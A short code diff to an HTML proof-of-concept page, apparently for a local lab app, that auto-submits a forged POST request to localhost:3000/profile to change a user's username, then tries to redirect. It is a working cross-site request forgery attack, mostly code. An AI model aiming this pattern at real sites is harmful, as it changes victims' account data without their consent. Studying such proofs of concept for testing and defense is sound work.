@@ -4,13 +4,19 @@
     <title>CSRF Attack</title>
 </head>
 <body>
-    <form action="http://localhost:3000/profile" method="POST">
+    <form id="csrf-form" action="http://localhost:3000/profile" method="POST">
         <input type="text" name="username" value="CSRF Attack">
         <input type="submit">
     </form>
     <script>
-        document.forms[0].submit();
+        document.getElementById('csrf-form').addEventListener('submit', function() {
+            // Delay redirect to ensure form submission is processed
+            setTimeout(function() {
+                window.location.href = 'http://localhost:3000/#/';
+            }, 1000); // Adjust the delay as needed
+        });
         
+        document.getElementById('csrf-form').submit();
     </script>
 </body>
 </html>
